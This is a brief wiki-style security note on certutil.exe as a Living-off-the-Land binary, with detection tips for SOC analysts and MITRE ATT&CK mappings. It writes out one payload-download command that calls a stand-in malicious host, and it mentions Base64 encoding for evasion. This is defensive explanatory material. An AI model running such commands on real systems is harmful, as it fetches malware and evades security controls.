# Certutil.exe

## What it is
Think of it as a Swiss Army knife that was issued to the IT department but keeps getting stolen by criminals — it's a legitimate Windows command-line utility designed to manage certificates, certificate authorities, and cryptographic operations. Specifically, it's a built-in Microsoft tool (`certutil.exe`) used for certificate enrollment, verification, and PKI management that ships with every Windows installation.

## Why it matters
Attackers abuse certutil as a **Living-off-the-Land Binary (LOLBin)** to download malicious payloads from the internet while bypassing security controls, because outbound traffic from a trusted Windows system binary rarely triggers alerts. In documented APT campaigns, threat actors have used `certutil -urlcache -split -f http://malicious.com/payload.exe` to fetch second-stage malware without touching conventional download tools like PowerShell or curl.

## Key facts
- **LOLBIN abuse**: Certutil can download files using the `-urlcache` flag, functioning as an HTTP/FTP client disguised as a certificate tool
- **Encoding/decoding**: Attackers use `certutil -encode` and `certutil -decode` to convert malicious files to/from Base64, evading content-based detection
- **Cache location**: Downloaded files are cached at `%LocalAppData%\Microsoft\Windows\INetCache`, which can be a forensic artifact goldmine
- **MITRE ATT&CK mapping**: Appears under **T1105** (Ingress Tool Transfer) and **T1027** (Obfuscated Files or Information)
- **Detection tip**: Legitimate use of certutil rarely involves `-urlcache`; network connections spawned by certutil.exe are a high-fidelity alert signal for SOC analysts

## Related concepts
[[Living-off-the-Land Binaries]] [[MITRE ATT&CK Framework]] [[Base64 Encoding]] [[Defense Evasion]] [[Indicator of Compromise]]